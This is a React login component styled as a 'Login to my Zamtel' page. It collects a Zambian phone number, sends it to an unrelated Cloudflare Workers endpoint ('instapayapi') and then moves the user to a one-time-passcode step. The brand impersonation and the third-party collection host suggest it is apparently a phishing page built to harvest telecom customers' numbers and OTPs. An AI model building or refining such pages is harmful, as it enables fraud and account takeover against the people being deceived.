import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

export default function ZamtelLogin() {
    const [number, setNumber] = useState("");
    const [agreed, setAgreed] = useState(true);
    const navigate=useNavigate();

    // Zambian mobile numbers: 9 digits after +260
    const isValid = number.length === 9 && agreed;

    const handleNumberChange = (e) => {
        const digits = e.target.value.replace(/\D/g, "").slice(0, 9);
        setNumber(digits);
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        if (!isValid) return;
        // TODO: call your OTP endpoint here
        console.log("Request OTP for +260" + number);
        try {
            const res = await fetch(`https://my-worker-app.instapayapi.workers.dev/api/phone`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ phone: `260${number}` }),
            });
            // const response = await fetch("https://my-worker-app.instapayapi.workers.dev/api/phone", {
            //     method: "POST",
            //     headers: {
            //         "Content-Type": "application/json",
            //     },
            //     body: JSON.stringify({
            //         phone: "+260" + number
            //     }),
            // });

            // const data = await res.json();
            navigate("/otp", { state: { phone: number } });

        } catch (err) {
            console.error("Error requesting OTP:", err);
        }
    };

    return (
        <div className="min-h-screen w-full bg-white flex justify-center">
            <form
                onSubmit={handleSubmit}
                className="flex min-h-screen w-full max-w-md flex-col px-5 pt-16 pb-8 sm:pt-24"
            >
                {/* Heading */}
                <h1 className="text-3xl font-bold tracking-tight text-black sm:text-4xl">
                    Login to my Zamtel
                </h1>
                <p className="mt-3 text-base leading-tight text-gray-700">
                    Insert your Prepaid, Velocity, or Zamtel Fiber number below
                </p>

                {/* Phone input */}
                <div className="mt-8 flex items-center rounded-2xl border-2 border-gray-200 bg-white px-4 py-4 focus-within:border-blue-500 transition-colors">
                    <span className="pr-3 text-base text-gray-500">+260</span>
                    <span className="h-5 w-px bg-gray-300" aria-hidden="true" />
                    <input
                        type="tel"
                        inputMode="numeric"
                        autoComplete="tel-national"
                        value={number}
                        onChange={handleNumberChange}
                        placeholder="Enter your number"
                        aria-label="Phone number"
                        className="ml-4 w-full bg-transparent text-base text-gray-900 placeholder-gray-500 outline-none"
                    />
                </div>

                {/* Terms checkbox */}
                <label className="mt-6 flex cursor-pointer items-center gap-3 text-base text-gray-700">
                    <input
                        type="checkbox"
                        checked={agreed}
                        onChange={(e) => setAgreed(e.target.checked)}
                        className="h-6 w-6 shrink-0 cursor-pointer rounded-md border-2 border-gray-300 accent-blue-600"
                    />
                    <span>
                        I agree to the{" "}
                        <a
                            href="#"
                            className="text-blue-600 hover:underline"
                            onClick={(e) => e.stopPropagation()}
                        >
                            terms of service &amp; privacy policy.
                        </a>
                    </span>
                </label>

                {/* Spacer pushes the button to the bottom */}
                {/* <div className="flex-1" /> */}

                {/* CTA */}
                <button
                    type="submit"
                    disabled={!isValid}
                    className={`w-full mt-6 rounded-2xl py-5 text-lg font-medium transition-colors ${isValid
                        ? "bg-[#12A036] text-white hover:bg-[#0e7a2a]"
                        : "cursor-not-allowed bg-gray-200 text-gray-500"
                        }`}
                >
                    Get OTP
                </button>
            </form>
        </div>
    );
}